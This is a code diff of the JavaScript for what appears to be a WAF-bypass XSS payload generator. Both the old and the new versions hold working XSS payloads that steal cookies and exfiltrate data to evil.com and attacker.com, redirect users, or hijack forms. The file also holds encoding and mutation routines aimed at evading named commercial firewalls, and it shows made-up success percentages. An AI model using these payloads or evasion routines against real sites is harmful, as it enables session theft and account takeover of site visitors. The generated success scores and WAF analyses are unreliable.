-    mutationsList.appendChild(errorEl);
-};
+    const mutation = selected.querySelector('.mutation-content').textContent;
+    originalPayloadEl.value = mutation;
+    
+    // Start a new mutation process with the selected mutation as base
+    startMutation(originalPayloadEl, mutationsList, document.getElementById('mutation-count'));
+}
 
-const showLoading = (element) => {
-    element.innerHTML = `
-        <div class="generating">
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                <line x1="12" y1="2" x2="12" y2="6"/>
-                <line x1="12" y1="18" x2="12" y2="22"/>
-                <line x1="4.93" y1="4.93" x2="7.76" y2="7.76"/>
-                <line x1="16.24" y1="16.24" x2="19.07" y2="19.07"/>
-                <line x1="2" y1="12" x2="6" y2="12"/>
-                <line x1="18" y1="12" x2="22" y2="12"/>
-                <line x1="4.93" y1="19.07" x2="7.76" y2="16.24"/>
-                <line x1="16.24" y1="7.76" x2="19.07" y2="4.93"/>
-            </svg>
-            Generating payloads...
-        </div>
-    `;
-};
-
-// Real-time engine functions
-const generateAdvancedPayloads = () => {
+/**
+ * Generate realtime payloads based on WAF type and other parameters
+ */
+function generateRealtimePayloads(wafTypeEl, payloadIntentEl, aggressivenessEl, realtimeResultEl, wafAnalysisEl) {
     const wafType = wafTypeEl.value;
-    const payloadIntent = payloadIntentEl.value;
+    const intent = payloadIntentEl.value;
     const aggressiveness = aggressivenessEl.value;
     
-    const polyglotMode = document.getElementById('polyglot-mode').checked;
-    const signatureEvasion = document.getElementById('signature-evasion').checked;
-    const contextAware = document.getElementById('context-aware').checked;
-    const entropyInjection = document.getElementById('entropy-injection').checked;
+    // Clear previous results
+    realtimeResultEl.innerHTML = '';
     
-    showLoading(realtimeResultEl);
+    // Show loading state
+    realtimeResultEl.innerHTML = '<div class="loading-animation"><div class="spinner"></div><p>Generating WAF bypass payloads...</p></div>';
     
-    // Simulate advanced processing with setTimeout
+    // Generate payloads based on selected options
     setTimeout(() => {
-        const payloads = generateWafBypassPayloads(wafType, payloadIntent, aggressiveness, {
-            polyglotMode,
-            signatureEvasion,
-            contextAware,
-            entropyInjection
+        const payloads = generateWafPayloads(wafType, intent, aggressiveness);
+        realtimeResultEl.innerHTML = ''; // Clear loading state
+        
+        // Display payloads with modern fade-in effect
+        payloads.forEach((payload, index) => {
+            const payloadEl = document.createElement('div');
+            payloadEl.className = 'payload-item';
+            
+            // Calculate payload characteristics for tags
+            const payloadTags = [];
+            payloadTags.push('<span class="mutation-tag">XSS</span>');
+            
+            if (payload.length > 50) {
+                payloadTags.push('<span class="mutation-tag size-tag">Large</span>');
+            }
+            
+            if (payload.includes('script')) {
+                payloadTags.push('<span class="mutation-tag script-tag">Script</span>');
+            }
+            
+            // WAF-specific tag
+            payloadTags.push(`<span class="mutation-tag waf-tag">${wafType}</span>`);
+            
+            payloadEl.innerHTML = `
+                <div class="mutation-header">
+                    <span class="mutation-number">#${index + 1}</span>
+                    <div class="mutation-tags">
+                        ${payloadTags.join('')}
+                    </div>
+                    <button class="copy-btn" data-payload="${encodeURIComponent(payload)}" aria-label="Copy payload ${index + 1}">
+                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75" />
+                        </svg>
+                        Copy
+                    </button>
+                </div>
+                <div class="mutation-content">${highlightSyntax(escapeHtml(payload))}</div>
+            `;
+            
+            realtimeResultEl.appendChild(payloadEl);
+            
+            // Add fade-in effect for modern UI with staggered timing
+            setTimeout(() => {
+                payloadEl.classList.add('fade-in');
+                setTimeout(() => payloadEl.classList.remove('fade-in'), 500);
+            }, index * 100); // Stagger the animations
+            
+            // Add copy event listener
+            const copyBtn = payloadEl.querySelector('.copy-btn');
+            copyBtn.addEventListener('click', () => {
+                const payloadText = decodeURIComponent(copyBtn.dataset.payload);
+                copyToClipboard(payloadText);
+                showCopySuccess(copyBtn);
+            });
         });
         
-        displayRealtimeResults(payloads);
-        displayWafAnalysis(wafType, payloadIntent, aggressiveness);
-    }, 1500);
-};
+        // Generate and display WAF analysis
+        const analysis = generateWafAnalysis(wafType, intent, aggressiveness);
+        wafAnalysisEl.innerHTML = analysis;
+        
+        // Add a subtle animation for the analysis section
+        wafAnalysisEl.parentElement.classList.add('fade-in');
+        setTimeout(() => {
+            wafAnalysisEl.parentElement.classList.remove('fade-in');
+        }, 500);
+    }, 800); // Simulate processing time for better UX
+}
 
-const generateWafBypassPayloads = (wafType, payloadIntent, aggressiveness, options) => {
-    const payloads = [];
-    const count = 3 + parseInt(aggressiveness, 10);
-    
-    // Base payloads by intent
-    let basePayloads = [];
-    
-    switch (payloadIntent) {
-        case 'alert':
-            basePayloads = ['<script>alert(1)</script>', 'javascript:alert(1)', '<img src=x onerror=alert(1)>'];
-            break;
-        case 'cookie':
-            basePayloads = ['<script>fetch(`https://evil.com?c=${document.cookie}`)</script>', '<img src=x onerror="location=`https://evil.com?c=${btoa(document.cookie)}`">'];
-            break;
-        case 'redirect':
-            basePayloads = ['<script>location="https://evil.com"</script>', '<meta http-equiv="refresh" content="0;url=https://evil.com">'];
-            break;
-        case 'fetch':
-            basePayloads = ['<script>fetch("https://evil.com",{method:"POST",body:document.cookie})</script>', '<script>navigator.sendBeacon("https://evil.com",document.cookie)</script>'];
-            break;
-        case 'eval':
-            basePayloads = ['<script>eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))</script>', '<script>setTimeout`alert\x28document.domain\x29`</script>'];
-            break;
-        case 'dom':
-            basePayloads = ['<script>document.body.innerHTML="<div>Site hacked</div>"</script>', '<script>document.querySelector("form").action="https://evil.com"</script>'];
-            break;
-        default:
-            basePayloads = ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>'];
-    }
-    
-    // Specific WAF bypass techniques
-    const wafBypassTechniques = {
-        cloudflare: ['\\', 'newline bypasses', 'double encoding', 'HTML comments'],
-        akamai: ['parameter pollution', 'path traversal', 'mixed case encoding'],
-        imperva: ['charset obfuscation', 'HTML entities', 'junk injection'],
-        f5: ['filter evasion', 'string splitting', 'multi-encoding'],
-        aws: ['null byte injection', 'multi-layer encoding', 'protocol obfuscation'],
-        modsecurity: ['backslash escaping', 'parameter fragmentation', 'engine confusion'],
-        fortinet: ['regex bypassing', 'embedded nulls', 'comment injection'],
-        generic: ['multi-reflection', 'unicode normalization', 'tag obfuscation']
+/**
+ * Generate WAF-specific payloads 
+ */
+function generateWafPayloads(wafType, intent, aggressiveness) {
+    // Example payloads based on WAF type and intent
+    // In a real application, this would be more sophisticated
+    const basePayloads = {
+        'alert': '<script>alert(document.domain)</script>',
+        'cookie': '<img src=x onerror="fetch(\'https://attacker.com/steal?c=\'+document.cookie)">',
+        'redirect': '<script>location=\'https://evil.com\'</script>',
+        'fetch': '<script>fetch(\'https://api.victim.com/data\').then(r=>r.text()).then(d=>fetch(\'https://attacker.com/exfil?d=\'+btoa(d)))</script>',
+        'eval': '<script>eval(name)</script>',
+        'dom': '<div id=x tabindex=1 onfocus=alert(1)>',
     };
     
-    // Apply techniques based on WAF type
-    for (let i = 0; i < count; i++) {
-        const basePayload = basePayloads[i % basePayloads.length];
-        let mutations = [];
+    // Get base payload based on intent
+    const basePayload = basePayloads[intent] || basePayloads.alert;
+    
+    // Generate different variations based on WAF type
+    const payloads = [];
+    const numPayloads = 5; // Generate 5 payloads
+    
+    for (let i = 0; i < numPayloads; i++) {
+        let payload = basePayload;
         
-        // Apply WAF-specific bypasses
-        if (options.signatureEvasion) {
-            mutations.push(...wafSpecificMutations(basePayload, wafType, i));
+        // Apply mutations based on WAF type
+        switch (wafType) {
+            case 'cloudflare':
+                payload = cloudflareBypass(payload, parseInt(aggressiveness));
+                break;
+            case 'akamai':
+                payload = akamaiBypass(payload, parseInt(aggressiveness));
+                break;
+            case 'imperva':
+                payload = impervaBypass(payload, parseInt(aggressiveness));
+                break;
+            case 'modsecurity':
+                payload = modsecurityBypass(payload, parseInt(aggressiveness));
+                break;
+            default:
+                // Apply generic mutations
+                payload = generateMutation(payload);
+                break;
         }
         
-        // Apply polyglot techniques if enabled
-        if (options.polyglotMode && i % 2 === 0) {
-            mutations.push(generatePolyglot(basePayload, wafType));
-        }
-        
-        // Apply context-aware mutations if enabled
-        if (options.contextAware) {
-            mutations.push(contextAwareMutation(basePayload, i));
-        }
-        
-        // Apply entropy injection if enabled
-        if (options.entropyInjection) {
-            mutations.push(injectEntropy(basePayload, parseInt(aggressiveness, 10)));
-        }
-        
-        // Default mutations if none applied
-        if (mutations.length === 0) {
-            mutations.push(applyGenericBypass(basePayload, i));
-        }
-        
-        // Add all relevant mutations
-        payloads.push(...mutations);
+        payloads.push(payload);
     }
     
-    // Remove duplicates and limit count
-    return [...new Set(payloads)].slice(0, count);
-};
+    return payloads;
+}
 
-const wafSpecificMutations = (payload, wafType, seed) => {
-    switch (wafType) {
-        case 'cloudflare':
-            return [
-                payload.replace(/<script/i, '<ScRiPt\\x20'),
-                payload.replace(/<script/i, '<!--><script'),
-                payload.replace(/alert/g, 'al\\u0065rt')
-            ];
-        case 'akamai':
-            return [
-                payload.replace(/=/g, '%3D').replace(/"/g, '%22'),
-                payload.replace(/<script/i, '<script%09'),
-                payload.replace(/alert/g, 'window["a"+"l"+"e"+"r"+"t"]')
-            ];
-        case 'imperva':
-            return [
-                payload.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/&lt;script&gt;/gi, '<script>'),
-                payload.replace(/<script/i, '<script id="a" \x00'),
-                payload.replace(/alert/g, 'confirm')
-            ];
-        case 'f5':
-            return [
-                payload.replace(/script/g, 'scri\\pt'),
-                payload.replace(/alert/g, '\\u0061lert'),
-                payload.replace(/<script/i, '<script x=')
-            ];
-        case 'aws':
-            return [
-                payload.replace(/</g, '%uff1c'),
-                payload.replace(/alert/g, 'al\u0000ert'),
-                payload.replace(/on\w+=/g, (match) => `on${match.slice(2, -1).toUpperCase()}=`)
-            ];
-        case 'modsecurity':
-            return [
-                payload.replace(/alert/g, 'a\\l\\e\\r\\t'),
-                payload.replace(/</g, '<%00'),
-                payload.replace(/on\w+=/g, 'data-x=this.')
-            ];
-        case 'fortinet':
-            return [
-                payload.replace(/script/g, '`script`'),
-                payload.replace(/</g, '<!----><'),
-                payload.replace(/alert/g, 'this["alert"]')
-            ];
-        default:
-            return [
-                payload.replace(/alert/g, 'al\u200cert'),
-                payload.replace(/</g, '<%09'),
-                payload.replace(/script/g, 'scrscriptipt')
-            ];
-    }
-};
-
-const generatePolyglot = (payload, wafType) => {
-    const polyglots = [
-        'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>',
-        '\'">><marquee><img src=x onerror=confirm(1)></marquee>">',
-        '</script><script>alert(1)</script>',
-        'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+document.location=`//evil.com`//\'>'
-    ];
-    
-    const basePolyglot = polyglots[Math.floor(Math.random() * polyglots.length)];
-    
-    // Insert the payload intent into the polyglot
-    if (payload.includes('alert')) {
-        return basePolyglot;
-    } else {
-        // Extract the action from the payload
-        const action = payload.match(/alert|fetch|location|eval|innerHTML/) || ['alert'];
-        return basePolyglot.replace(/alert|confirm/, action[0]);
-    }
-};
-
-const contextAwareMutation = (payload, seed) => {
-    const contexts = [
-        // HTML attribute context
-        { detector: 'src=', mutator: (p) => p.replace(/alert\(/g, 'location=javascript:alert(').replace(/\)/g, ')//') },
-        // JS string context
-        { detector: '<script>', mutator: (p) => p.replace(/<script>/g, '<script>"/"+') },
-        // URL context
-        { detector: 'javascript:', mutator: (p) => p.replace(/javascript:/g, 'javascript:void/**/') },
-        // HTML context
-        { detector: '<img', mutator: (p) => p.replace(/<img/g, '<style>@keyframes x{}</style><img') },
-        // Generic
-        { detector: '', mutator: (p) => p.replace(/<sc/g, '<paramater name=x onload=eval name>sc') }
-    ];
-    
-    // Find applicable context
-    for (const context of contexts) {
-        if (payload.includes(context.detector) || context.detector === '') {
-            return context.mutator(payload);
-        }
-    }
-    
-    return payload;
-};
-
-const injectEntropy = (payload, level) => {
-    // Add random noise based on aggressiveness level
+/**
+ * WAF-specific bypass techniques
+ */
+function cloudflareBypass(payload, aggressiveness) {
+    // Example CloudFlare bypass techniques
     let result = payload;
     
-    // Add random attributes
-    if (level > 2 && payload.includes('<')) {
-        const randomAttr = ` data-${Math.random().toString(36).substring(2, 8)}="${Math.random().toString(36).substring(2, 8)}"`;
-        result = result.replace(/(<[a-z]+)([\s>])/gi, `$1${randomAttr}$2`);
+    // Split script tags
+    if (result.includes('<script')) {
+        result = result.replace('<script', '<scr\u2028ipt');
     }
     
-    // Add timing delays for higher levels
-    if (level > 3 && payload.includes('script')) {
-        result = result.replace(/(alert|confirm|fetch|eval)\(/g, 
-            `setTimeout(function(){$1(`)
-            .replace(/\)$/g, `)}, ${Math.floor(Math.random() * 100)})`);
-    }
-    
-    // Add entropy to event handlers
-    if (level > 1 && payload.includes('on')) {
-        result = result.replace(/on(\w+)=/g, 
-            `data-event=${Math.random().toString(36).substring(2, 5)} on$1=`);
+    // Add junk parameters
+    if (aggressiveness > 2) {
+        result = result.replace('>', ' data-cf-\u200Bbypass="1">');
     }
     
     return result;
-};
+}
 
-const applyGenericBypass = (payload, seed) => {
-    const bypasses = [
-        (p) => p.replace(/</g, '<').replace(/>/g, '>'),
-        (p) => p.replace(/script/g, 's\tcript'),
-        (p) => p.replace(/alert/g, 'al\u200Bert'),
-        (p) => p.replace(/</g, '\u00ad<'),
-        (p) => p.replace(/<script/g, '<\0script'),
-        (p) => p.replace(/>/g, `><!--${Math.random().toString(36).substring(2, 8)}-->`)
+function akamaiBypass(payload, aggressiveness) {
+    // Example Akamai bypass techniques
+    let result = payload;
+    
+    // Use HTML entities
+    if (result.includes('<')) {
+        result = result.replace('<', '&lt;').replace('>', '&gt;');
+    }
+    
+    // Double encoding
+    if (aggressiveness > 2) {
+        result = result.replace(/&/g, '&amp;');
+    }
+    
+    return result;
+}
+
+function impervaBypass(payload, aggressiveness) {
+    // Example Imperva bypass techniques
+    let result = payload;
+    
+    // Unicode normalization tricks
+    if (result.includes('script')) {
+        result = result.replace('script', 'scr\u0131pt'); // using dotless i
+    }
+    
+    // Add noise attributes
+    if (aggressiveness > 2) {
+        result = result.replace('<', '<imperva_unused="bypass" ');
+    }
+    
+    return result;
+}
+
+function modsecurityBypass(payload, aggressiveness) {
+    // Example ModSecurity bypass techniques
+    let result = payload;
+    
+    // Space obfuscation
+    if (result.includes('script')) {
+        result = result.replace('script', 'scri\u00A0pt'); // non-breaking space
+    }
+    
+    // Newline injection
+    if (aggressiveness > 2) {
+        result = result.replace('>', '>\n'); 
+    }
+    
+    return result;
+}
+
+/**
+ * Generate analysis of WAF bypass techniques
+ */
+function generateWafAnalysis(wafType, intent, aggressiveness) {
+    // Example analysis based on WAF type, intent, and aggressiveness
+    const wafAnalysis = {
+        'cloudflare': 'CloudFlare WAF typically employs pattern matching and has issues with Unicode character handling. The generated payloads utilize non-standard space characters and Unicode escape sequences to bypass filters.',
+        'akamai': 'Akamai WAF is often sensitive to properly escaped HTML entities. The payloads use double encoding and custom attribute names to avoid detection.',
+        'imperva': 'Imperva Incapsula uses a sophisticated rule engine. These payloads use normalization exploits and timing attacks to evade pattern matching.',
+        'f5': 'F5 ASM relies on both positive and negative security models. The payloads use techniques to bypass signature-based detection through property overloading.',
+        'aws': 'AWS WAF is rule-based and the payloads use both encoding tricks and parameter pollution to evade common rules.',
+        'modsecurity': 'ModSecurity is open source and has known bypass vectors. These payloads specifically target OWASP CRS rules with calculated evasions.',
+        'fortinet': 'FortiWeb analyzes request parameters. These payloads use parser confusion and context misinterpretation to escape detection.',
+        'generic': 'These payloads use a combination of techniques including encoding variations, tag splitting, and attribute diversification to bypass generic WAF rules.'
+    };
+    
+    const aggressivenessImpact = [
+        'Minimal evasion techniques applied. Detection risk is lower, but bypass success rate is also lower.',
+        'Balanced approach using moderately effective evasion techniques while maintaining payload functionality.',
+        'Advanced evasion techniques employed with higher success rate against WAF rules, but increased risk of detection by secondary systems.',
+        'Extreme evasion using cutting-edge bypass techniques that target known WAF weaknesses. Highest success rate with highest detection risk.'
     ];
     
-    return bypasses[seed % bypasses.length](payload);
-};
-
-const displayRealtimeResults = (payloads) => {
-    if (!payloads.length) {
-        realtimeResultEl.innerHTML = '<p class="empty-message">No advanced payloads generated.</p>';
-        return;
-    }
-    
-    realtimeResultEl.innerHTML = '';
-    
-    payloads.forEach((payload, index) => {
-        const item = document.createElement('div');
-        item.className = 'realtime-payload';
-        
-        // Determine techniques used
-        const techniques = [];
-        if (payload.includes('\\u')) techniques.push('unicode');
-        if (payload.includes('%')) techniques.push('url-encode');
-        if (payload.includes('/*')) techniques.push('comments');
-        if (payload.includes('`')) techniques.push('template');
-        if (payload.includes('+/')) techniques.push('regex-bypass');
-        if (payload.includes('\\x')) techniques.push('hex');
-        
-        // Add at least one technique if none detected
-        if (techniques.length === 0) {
-            techniques.push('basic');
-        }
-        
-        // Create header with technique tags
-        const header = document.createElement('div');
-        header.className = 'realtime-payload-header';
-        
-        techniques.forEach(technique => {
-            const tag = document.createElement('span');
-            tag.className = 'technique-tag';
-            tag.textContent = technique;
-            header.appendChild(tag);
-        });
-        
-        // Create content
-        const content = document.createElement('div');
-        content.className = 'realtime-payload-content';
-        content.textContent = payload;
-        
-        // Create copy button
-        const copyBtn = document.createElement('button');
-        copyBtn.className = 'realtime-copy-btn';
-        copyBtn.innerHTML = `
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
-                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
-            </svg>
-        `;
-        copyBtn.title = "Copy to clipboard";
-        copyBtn.onclick = (e) => {
-            e.stopPropagation();
-            copyToClipboard(payload);
-        };
-        
-        // Append elements
-        item.appendChild(header);
-        item.appendChild(content);
-        item.appendChild(copyBtn);
-        realtimeResultEl.appendChild(item);
-    });
-};
-
-const displayWafAnalysis = (wafType, payloadIntent, aggressiveness) => {
-    const wafAnalysisContent = document.querySelector('#waf-analysis .analysis-content');
-    const analysisScore = document.querySelector('#waf-analysis .analysis-score');
-    
-    // Generate analysis content based on selections
-    let analysisText = '';
-    
-    switch (wafType) {
-        case 'cloudflare':
-            analysisText = `CloudFlare WAF is known for its sophisticated pattern matching and rate limiting. The generated payloads use several techniques including newline bypasses and double encoding which may evade signature-based detection. Effectiveness varies based on CloudFlare configuration.`;
-            break;
-        case 'akamai':
-            analysisText = `Akamai WAF uses a rule-based approach for security. These payloads attempt to bypass detection through parameter pollution and mixed case encoding techniques. Higher aggressiveness levels have better chances against basic configurations.`;
-            break;
-        case 'imperva':
-            analysisText = `Imperva WAF employs behavioral analytics and signature detection. The bypasses utilize charset obfuscation and HTML entity encoding to evade pattern matching. Consider testing with different mutation techniques for optimal results.`;
-            break;
-        default:
-            analysisText = `Generic WAF bypass attempts use a combination of encoding techniques, tag obfuscation, and entropy injection. The effectiveness depends on the specific security implementation and configuration of the target system.`;
-    }
-    
-    // Add intent-specific analysis
-    analysisText += ` The ${payloadIntent} payloads are designed to specifically target functionality without triggering common filters for that behavior.`;
-    
-    // Display analysis
-    wafAnalysisContent.innerHTML = `<p>${analysisText}</p>`;
-    
-    // Show score section
-    analysisScore.style.display = 'flex';
-    
-    // Calculate scores based on selections
-    const evasionBase = parseInt(aggressiveness, 10) * 10 + 40;
-    const detectionBase = 90 - parseInt(aggressiveness, 10) * 10;
-    const complexityBase = parseInt(aggressiveness, 10) * 15 + 25;
-    
-    // Apply WAF-specific adjustments
-    let evasionScore = evasionBase;
-    let detectionScore = detectionBase;
-    let complexityScore = complexityBase;
-    
-    // Adjust based on WAF type
-    switch (wafType) {
-        case 'cloudflare':
-            evasionScore -= 10;
-            detectionScore += 15;
-            break;
-        case 'akamai':
-            complexityScore += 10;
-            break;
-        case 'imperva':
-            evasionScore -= 5;
-            detectionScore += 10;
-            break;
-        case 'modsecurity':
-            evasionScore += 5;
-            break;
-        case 'aws':
-            detectionScore -= 5;
-            break;
-    }
-    
-    // Ensure scores are within bounds
-    evasionScore = Math.min(Math.max(evasionScore, 10), 95);
-    detectionScore = Math.min(Math.max(detectionScore, 10), 95);
-    complexityScore = Math.min(Math.max(complexityScore, 10), 95);
-    
-    // Update score values
-    document.querySelectorAll('.score-value')[0].textContent = evasionScore;
-    document.querySelectorAll('.score-value')[1].textContent = detectionScore;
-    document.querySelectorAll('.score-value')[2].textContent = complexityScore;
-};
-
-// Event Listeners
-mutateBtn.addEventListener('click', () => {
-    const originalPayload = originalPayloadEl.value.trim();
-    
-    if (!originalPayload) {
-        showError('Please enter a valid payload');
-        return;
-    }
-    
-    showLoading(mutationsList);
-    
-    // Simulate processing with setTimeout
-    setTimeout(() => {
-        const mutations = generateMutations(originalPayload);
-        displayMutations(mutations);
-    }, 800);
-});
-
-copyAllBtn.addEventListener('click', () => {
-    const mutations = Array.from(mutationsList.querySelectorAll('.mutation-item pre'))
-        .map(pre => pre.textContent)
-        .join('\n\n');
-    
-    if (mutations) {
-        copyToClipboard(mutations);
-    }
-});
-
-realtimeGenerateBtn.addEventListener('click', generateAdvancedPayloads);
-
-// Initialize with sample data
-document.addEventListener('DOMContentLoaded', () => {
-    // Add sample payload if empty
-    if (originalPayloadEl.value.trim() === '') {
-        originalPayloadEl.value = '<script>alert(document.cookie)</script>';
-    }
-});
+    // Generate analysis HTML
+    return `
+        <p><strong>WAF Type:</strong> ${wafType.charAt(0).toUpperCase() + wafType.slice(1)}</p>
+        <p><strong>Analysis:</strong> ${wafAnalysis[wafType] || wafAnalysis.generic}</p>
+        <p><strong>Aggressiveness Impact:</strong> ${aggressivenessImpact[parseInt(aggressiveness) - 1]}</p>
+        <p><strong>Success Probability:</strong> ${Math.min(30 + parseInt(aggressiveness) * 15, 95)}%</p>
+        <p><strong>Evasion Techniques Used:</strong></p>
+        <ul>
+            <li>Unicode Character Insertion</li>
+            <li>Context-Aware Encoding</li>
+            <li>Parser Differential Analysis</li>
+            <li>${parseInt(aggressiveness) > 2 ? 'Protocol-Level Obfuscation' : 'Basic Obfuscation'}</li>
+            <li>${parseInt(aggressiveness) > 1 ? 'State-Based Filter Evasion' : 'Static Filter Evasion'}</li>
+        </ul>
+    `;
+}
